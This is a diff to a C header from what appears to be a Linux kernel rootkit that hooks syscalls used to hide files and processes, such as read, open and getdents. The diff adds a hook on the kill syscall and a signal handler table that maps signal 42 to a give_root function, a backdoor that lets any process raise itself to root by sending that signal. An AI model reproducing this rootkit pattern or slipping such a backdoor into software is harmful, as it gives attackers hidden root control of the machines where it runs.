@@ -3,9 +3,12 @@
 
 #include "hooking.h"
 #include "macro-utils.h"
+#include "utils.h"
 
 #define P_SYSCALL_HOOKS  (p_syscall_hooks)
 #define NR_SYSCALL_HOOKS (ARRAY_SIZE(P_SYSCALL_HOOKS))
+
+#define SIGNAL_ROOT 42 // The signal to send to elevate the current process to root
 
 /**
  * Defines how to name a syscall hook handler function.
@@ -31,6 +34,11 @@ struct linux_dirent {
 };
 
 INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64,
-                   getpid)
+                   getpid, kill)
+
+// Define signal handler array
+signal_handler_t p_signal_hooks[] = {
+    NEW_SIGNAL_HANDLER(-1, SIGNAL_ROOT, give_root),
+};
 
 #endif
